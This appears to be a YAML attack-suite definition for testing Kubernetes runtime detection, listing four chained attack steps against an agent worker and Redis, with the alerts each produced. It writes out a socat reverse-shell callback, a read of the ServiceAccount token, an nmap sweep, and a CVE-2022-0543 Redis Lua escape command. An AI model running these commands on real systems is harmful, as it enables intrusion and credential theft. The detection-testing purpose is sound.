@@ -1,0 +1,101 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: iktlinz-2027-chain
+  description: |
+    The IKT-Linz chain, one attack per silent_miss_gate entry in the
+    window.json that run-iktlinz-e2e.sh emits.
+
+    expectedDetections are OBSERVED, not derived. They come from a full
+    20/20 run against bound SBoBs, read out of the node-agent alert stream
+    keyed by RuleID + containerName + profileMetadata.name, cross-checked
+    against Ran's execution records for the actor of each step.
+
+    Read the per-step notes before scoring. Three of these four steps run in
+    agent-worker, which carries NO user-defined profile: the orchestrator
+    creates worker pods per task and never stamps the
+    kubescape.io/user-defined-profile label, so node-agent covers them as
+    rogue artefacts instead of binding a profile. Rules that need a profile
+    to define "unexpected" therefore cannot fire there, and the absence is
+    structural, not a tuning miss. redis-rce is the contrast: redis IS
+    bound, and the same class of action lights up.
+
+    This is the first four entries only — the ones with a single
+    unambiguous actor. The remaining four follow.
+
+target:
+  namespace: agent-system
+  execTarget: agent-worker
+
+attacks:
+  - name: worker-callback
+    type: cmdinject
+    gateEntry: worker-callback
+    actor: agent-system/agent-worker
+    exec: { command: ["socat", "TCP:$LISTENER:1337", "EXEC:sh"] }
+    notes: |
+      Initial foothold. Ran creates a listener on :1337 and induces a worker
+      pod to socat back to it.
+      OBSERVED: no process-level alert for socat itself. agent-worker is
+      unprofiled, so R0001 (which needs a profile to know socat is
+      unexpected) cannot fire. What did fire is R1017, because the pod is a
+      rogue artefact — which is coverage of the POD, not of the callback.
+    expectedDetections:
+      - { ruleID: R1017, ruleName: Rogue artefact, containerName: worker }
+
+  - name: sa-token-read
+    type: cmdinject
+    gateEntry: sa-token-read
+    actor: agent-system/agent-worker
+    exec: { command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"] }
+    notes: |
+      Reads the worker's own mounted ServiceAccount token.
+      OBSERVED: NO R0006 on agent-worker. This is a genuine silent miss in
+      the run and the single most important entry on this list — the same
+      action DOES raise R0006 on redis and on the otel sidecar, both of
+      which are bound. Scoring this as covered because R0006 exists in the
+      ruleset would be wrong.
+      The worker did raise R0010 in the same window, but on /etc/shadow
+      during package installation, not on the token — do not credit it here.
+    expectedDetections: []
+
+  - name: nmap-sweep
+    type: cmdinject
+    gateEntry: nmap-sweep
+    actor: agent-system/agent-worker
+    exec: { command: ["nmap", "-sT", "-F", "$POD_CIDR_27"] }
+    notes: |
+      Sweeps the /27 containing the redis target. The discriminant a
+      detector should key on is many unique destinations from one process
+      in a short window, not the binary name.
+      OBSERVED: R1012 once on agent-worker. No per-destination egress alert,
+      again because the worker is unprofiled and R0011 needs a declared
+      egress set to call a peer undeclared.
+      The CIDR is computed at run time by demo_chain.py and anchored on the
+      redis address; it is a /27 on every topology.
+    expectedDetections:
+      - { ruleID: R1012, containerName: worker }
+
+  - name: redis-rce
+    type: cmdinject
+    gateEntry: redis-rce
+    actor: oopservability/oopservability-redis
+    exec:
+      command: ["redis-cli", "-h", "$REDIS_IP", "-p", "6379", "EVAL",
+                "local io_l = package.loadlib(...); io_l(); os.execute('id')", "0"]
+    notes: |
+      CVE-2022-0543, the Lua sandbox escape. Issued from the worker
+      foothold; the shell it spawns runs INSIDE the redis container, so the
+      actor for detection purposes is redis, while the actor for the command
+      is the worker. Both are recorded in Ran's execution records.
+      OBSERVED: fires broadly, because redis is bound to a User SBoB learned
+      from a benign-only window with 3 execs. This is the contrast case that
+      shows the three entries above are limited by profile coverage rather
+      than by rule coverage.
+      R1001 is also observed on the WORKER for the redis-cli that issues it.
+    expectedDetections:
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: sh }
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: id }
+      - { ruleID: R0002, ruleName: Files Access Anomalies in container, containerName: redis, command: sh }
+      - { ruleID: R0004, ruleName: Linux Capabilities Anomalies in container, containerName: redis, command: sh }
+      - { ruleID: R1001, ruleName: Drifted process executed, containerName: worker, command: redis-cli }
